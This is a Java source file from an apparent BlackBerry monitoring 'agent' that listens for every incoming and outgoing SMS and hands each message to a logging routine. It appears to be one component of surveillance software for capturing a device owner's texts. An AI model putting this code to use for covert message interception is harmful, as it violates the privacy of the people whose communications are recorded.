package blackberry.agent.sms;

import java.io.IOException;

import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.MessageListener;

import net.rim.blackberry.api.sms.OutboundMessageListener;

import blackberry.fs.Path;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

class SMSInOutListener implements OutboundMessageListener, Runnable {

    //#ifdef DEBUG
    static Debug debug = new Debug("SMSINListener", DebugLevel.VERBOSE);

    //#endif

    static int totOut, totIn;

    private int inMessages;
    private final SmsListener smsListener;
    private final MessageConnection conn;

    boolean requestStop;

    public SMSInOutListener(final MessageConnection conn,
            final SmsListener smsListener) {
        inMessages = 0;

        this.conn = conn;
        this.smsListener = smsListener;
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }

    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public synchronized void notifyIncomingMessage(final MessageConnection conn) {

        inMessages++;
        totIn++;

        try {
            notifyAll();
        } catch (IllegalMonitorStateException ex) {
            //#ifdef DEBUG_ERROR
            debug.error(ex);
            //#endif
        }
    }

    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public synchronized void notifyOutgoingMessage(final Message message) {
        //#ifdef DBC
        Check.requires(message != null, "notifyOutgoingMessage: null message ");
        //#endif

        totOut++;
        init();

        //#ifdef DEBUG_INFO
        debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
        //#endif

        if (!requestStop) {
            smsListener.saveLog(message, false);
        }

    }

    public synchronized void stop() {
        requestStop = true;
        try {
            notifyAll();
        } catch (IllegalMonitorStateException ex) {
            //#ifdef DEBUG_WARN
            debug.warn(ex);
            //#endif
        }
    }

    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public void run() {
        requestStop = false;
        while (!requestStop) {
            while (inMessages > 0) {
                try {
                    init();

                    final Message m = conn.receive();
                    smsListener.saveLog(m, true);

                } catch (final IOException e) {
                    //#ifdef DEBUG_ERROR
                    debug.error(e);
                    //#endif
                }
                inMessages--;
            }
            synchronized (this) {
                try {
                    wait();
                } catch (final Exception e) {
                    //#ifdef DEBUG_ERROR
                    debug.error(e);
                    //#endif
                }
            }
        }
    }

}
